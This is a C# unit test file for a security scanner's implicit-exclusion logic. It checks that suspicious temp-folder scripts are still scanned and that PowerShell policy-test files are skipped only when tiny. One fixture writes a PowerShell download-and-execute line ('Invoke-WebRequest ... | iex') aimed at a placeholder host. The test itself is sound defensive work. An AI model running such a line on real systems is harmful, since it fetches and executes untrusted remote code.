using optiCombat.Services;

namespace optiCombat.Tests;

public sealed class ScanImplicitExclusionsTests
{
    [Fact]
    public void Ide_named_script_in_temp_is_no_longer_excluded()
    {
        var path = Path.Combine(Path.GetTempPath(), $"ps-script-{Guid.NewGuid()}.ps1");
        File.WriteAllText(path, "Invoke-WebRequest http://example.invalid/x | iex");
        try
        {
            Assert.False(ScanImplicitExclusions.IsImplicitlyExcluded(path));
        }
        finally
        {
            File.Delete(path);
        }
    }

    [Fact]
    public void PowerShell_policy_test_file_is_excluded_only_when_tiny()
    {
        var small = Path.Combine(Path.GetTempPath(), $"__PSScriptPolicyTest_{Guid.NewGuid():N}.ps1");
        var large = Path.Combine(Path.GetTempPath(), $"__PSScriptPolicyTest_{Guid.NewGuid():N}.ps1");
        File.WriteAllText(small, "# PowerShell test file to determine AppLocker lockdown mode");
        File.WriteAllText(large, new string('A', (int)ScanImplicitExclusions.MaxPolicyTestFileBytes + 1));
        try
        {
            Assert.True(ScanImplicitExclusions.IsImplicitlyExcluded(small));
            Assert.False(ScanImplicitExclusions.IsImplicitlyExcluded(large));
        }
        finally
        {
            File.Delete(small);
            File.Delete(large);
        }
    }
}
